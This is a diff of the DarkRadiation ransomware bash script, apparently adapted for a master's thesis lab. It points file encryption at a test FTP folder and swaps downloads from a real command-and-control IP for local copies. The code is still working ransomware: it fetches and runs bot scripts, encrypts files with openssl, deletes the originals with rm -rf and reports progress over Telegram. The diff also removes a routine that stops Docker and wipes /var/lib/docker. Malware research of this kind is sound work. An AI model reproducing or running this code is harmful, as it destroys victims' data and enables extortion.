@@ -50,13 +50,13 @@ echo "start downloading bot"
 bot_who ()
 {
 #curl -s http://185.141.25.168/telegram_bot/bot.sh -o "/tmp/bot.sh";cd /tmp;chmod +x bot.sh;./bot.sh &
-cp home/bobo/Documents/MTD/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bot.sh /tmp/bot.sh;cd /tmp;chmod +x bot.sh;./bot.sh &
+cp /home/robert/Documents/MA_thesis/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bot.sh /tmp/bot.sh;cd /tmp;chmod +x bot.sh;./bot.sh & # CHANGE
 }
 
 bash ()
 {
 #curl -s http://185.141.25.168/bash.sh -o "/tmp/bash.sh";cd /tmp;chmod +x bash.sh;./bash.sh;
-cp home/bobo/Documents/MTD/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bash.sh /tmp/bash.sh;cd /tmp;chmod +x bash.sh;./bash.sh;
+cp /home/robert/Documents/MA_thesis/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bash.sh /tmp/bash.sh;cd /tmp;chmod +x bash.sh;./bash.sh; # CHANGE
 
 }
 
@@ -162,13 +162,13 @@ encrypt_home ()
         send_message $id "$(hostname): encrypt home files started."
         done
         #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
-        grep -r '/home/bobo/FTP' -e "" --include=\*.* -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
+        grep -r '/home/USERNAME_HERE/FTP/malicious_folder' -e "" --include=\*.* -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
         for id in $ID_MSG
         do
         send_message $id "$(hostname): encrypt home files Done. Delete files."
         done
         #grep -r '/home' -e "" -l | xargs rm -rf FILE
-        grep -r '/home/bobo/FTP' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
+        grep -r '/home/USERNAME_HERE/FTP/malicious_folder' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
         #dd if=/dev/zero of=/null
         #rm -rf /null
 }
@@ -191,13 +191,6 @@ encrypt_db ()
 }
 
 
-docker_stop_and_encrypt ()
-{
-    docker stop $(docker ps -aq)
-    systemctl stop docker && systemctl disable docker
-    rm -rf /var/lib/docker/
-}
-
 loop_wget_telegram ()
 {
 while true
@@ -206,9 +199,7 @@ do
    #wget http://185.141.25.168/attack_check/0.sh -P /tmp --quiet --spider
    #wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
    if [ $? = 0 ];then
-   user_change
-   create_user
-   encrypt_grep_files
+   #encrypt_grep_files
    encrypt_home
    encrypt_db
    #docker_stop_and_encrypt
